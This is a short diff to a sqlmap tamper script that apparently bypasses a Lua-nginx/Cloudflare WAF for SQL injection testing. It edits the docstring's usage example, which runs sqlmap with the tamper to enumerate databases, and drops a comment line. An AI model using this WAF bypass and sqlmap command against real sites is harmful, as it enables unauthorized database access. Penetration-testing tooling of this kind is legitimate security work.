@@ -12,7 +12,8 @@ Open Data Security (@ODSops) [https://ods.es]
 PoC: https://www.youtube.com/watch?v=JUvro7cqidY
 Vulnerability information: https://opendatasecurity.io/cloudflare-vulnerability-allows-waf-be-disabled/
 
-Example: sqlmap -r file.txt --tamper=luanginxwafbypass.py --dbs --skip-urlencode
+Example: sqlmap -r file.txt --tamper=luanginxwafbypass.py --dbs --skip-urlencode -p vulnparameter
+Required options: --skip-urlencode, -p
 '''
 
 import sys
@@ -32,8 +33,6 @@ def tamper(payload, **kwargs):
     try:
         headers = kwargs.get("headers", {})
         randomParameter = randomParameterGenerator()
-
-        ''' Get parameter name to test '''
         parameter = conf["testParameter"][0]
 
         if not parameter:
